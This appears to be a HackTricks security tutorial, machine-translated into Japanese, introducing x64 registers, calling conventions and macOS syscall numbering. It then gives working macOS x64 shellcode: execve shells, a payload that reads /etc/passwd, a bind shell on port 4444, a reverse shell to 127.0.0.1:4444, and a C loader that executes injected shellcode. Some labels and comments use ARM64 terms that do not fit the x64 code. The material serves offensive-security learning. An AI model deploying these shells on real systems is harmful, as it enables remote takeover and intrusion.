# Introduction to x64

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Introduction to x64**

x64、またはx86-64としても知られる、は主にデスクトップおよびサーバーコンピューティングで使用される64ビットプロセッサアーキテクチャです。Intelによって製造されたx86アーキテクチャに由来し、後にAMDによってAMD64という名前で採用され、現在のパーソナルコンピュータやサーバーで広く使用されています。

### **Registers**

x64はx86アーキテクチャを拡張し、**16の汎用レジスタ**を持ち、`rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi`、および`r8`から`r15`までのラベルが付けられています。これらの各レジスタは**64ビット**（8バイト）の値を格納できます。これらのレジスタには、互換性と特定のタスクのために32ビット、16ビット、8ビットのサブレジスタもあります。

1. **`rax`** - 通常、関数からの**戻り値**に使用されます。
2. **`rbx`** - メモリ操作のための**ベースレジスタ**としてよく使用されます。
3. **`rcx`** - **ループカウンタ**として一般的に使用されます。
4. **`rdx`** - 拡張算術演算を含むさまざまな役割で使用されます。
5. **`rbp`** - スタックフレームの**ベースポインタ**。
6. **`rsp`** - **スタックポインタ**、スタックのトップを追跡します。
7. **`rsi`**と**`rdi`** - 文字列/メモリ操作における**ソース**および**デスティネーション**インデックスに使用されます。
8. **`r8`**から**`r15`** - x64で導入された追加の汎用レジスタ。

### **Calling Convention**

x64の呼び出し規約はオペレーティングシステムによって異なります。例えば：

* **Windows**: 最初の**4つのパラメータ**はレジスタ**`rcx`**、**`rdx`**、**`r8`**、および**`r9`**に渡されます。さらにパラメータはスタックにプッシュされます。戻り値は**`rax`**にあります。
* **System V（UNIX系システムで一般的に使用される）**: 最初の**6つの整数またはポインタパラメータ**はレジスタ**`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`**、および**`r9`**に渡されます。戻り値も**`rax`**にあります。

関数に6つ以上の入力がある場合、**残りはスタックに渡されます**。**RSP**、スタックポインタは**16バイトアライン**されている必要があり、これは呼び出しが行われる前に指すアドレスが16で割り切れる必要があることを意味します。これは通常、関数呼び出しを行う前に、私たちのシェルコードでRSPが適切にアラインされていることを確認する必要があることを意味します。しかし、実際には、この要件が満たされていなくてもシステムコールは多くの場合機能します。

### Calling Convention in Swift

Swiftには独自の**呼び出し規約**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)で確認できます。

### **Common Instructions**

x64命令は豊富なセットを持ち、以前のx86命令との互換性を維持し、新しい命令を導入しています。

* **`mov`**: ある**レジスタ**または**メモリ位置**から別の場所に値を**移動**します。
* 例: `mov rax, rbx` — `rbx`から`rax`に値を移動します。
* **`push`**と**`pop`**: **スタック**に値をプッシュまたはポップします。
* 例: `push rax` — `rax`の値をスタックにプッシュします。
* 例: `pop rax` — スタックのトップの値を`rax`にポップします。
* **`add`**と**`sub`**: **加算**および**減算**操作。
* 例: `add rax, rcx` — `rax`と`rcx`の値を加算し、結果を`rax`に格納します。
* **`mul`**と**`div`**: **乗算**および**除算**操作。注意: これらはオペランドの使用に関して特定の動作を持ちます。
* **`call`**と**`ret`**: 関数を**呼び出す**および**戻る**ために使用されます。
* **`int`**: ソフトウェアの**割り込み**をトリガーするために使用されます。例: `int 0x80`は32ビットx86 Linuxでシステムコールに使用されました。
* **`cmp`**: 2つの値を**比較**し、結果に基づいてCPUのフラグを設定します。
* 例: `cmp rax, rdx` — `rax`を`rdx`と比較します。
* **`je`, `jne`, `jl`, `jge`, ...**: 前の`cmp`またはテストの結果に基づいて制御フローを変更する**条件付きジャンプ**命令。
* 例: `cmp rax, rdx`命令の後、`je label` — `rax`が`rdx`と等しい場合、`label`にジャンプします。
* **`syscall`**: 一部のx64システム（現代のUnixなど）での**システムコール**に使用されます。
* **`sysenter`**: 一部のプラットフォームでの最適化された**システムコール**命令。

### **Function Prologue**

1. **古いベースポインタをプッシュ**: `push rbp`（呼び出し元のベースポインタを保存）
2. **現在のスタックポインタをベースポインタに移動**: `mov rbp, rsp`（現在の関数のための新しいベースポインタを設定）
3. **ローカル変数のためにスタックにスペースを割り当てる**: `sub rsp, <size>`（`<size>`は必要なバイト数）

### **Function Epilogue**

1. **現在のベースポインタをスタックポインタに移動**: `mov rsp, rbp`（ローカル変数を解放）
2. **古いベースポインタをスタックからポップ**: `pop rbp`（呼び出し元のベースポインタを復元）
3. **戻る**: `ret`（呼び出し元に制御を戻す）

## macOS

### syscalls

さまざまなクラスのsyscallがあり、[**ここで見つけることができます**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
次に、各システムコール番号を[**このURL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**で見つけることができます：**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
そのため、**Unix/BSDクラス**から`open`システムコール（**5**）を呼び出すには、次のように追加する必要があります：`0x2000000`

したがって、`open`を呼び出すためのシステムコール番号は`0x2000005`になります。

### シェルコード

コンパイルするには：

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

バイトを抽出するには：

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>シェルコードをテストするためのCコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明されています。

{% tabs %}
{% tab title="adrを使用" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="スタックを使用" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### catで読む

目的は`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することであり、第二引数（x1）はパラメータの配列です（これはメモリ内ではアドレスのスタックを意味します）。
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### shを使ってコマンドを呼び出す
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

**ポート 4444** の [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) からの Bind shell
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### リバースシェル

リバースシェルは [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) から。リバースシェルは **127.0.0.1:4444** へ。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
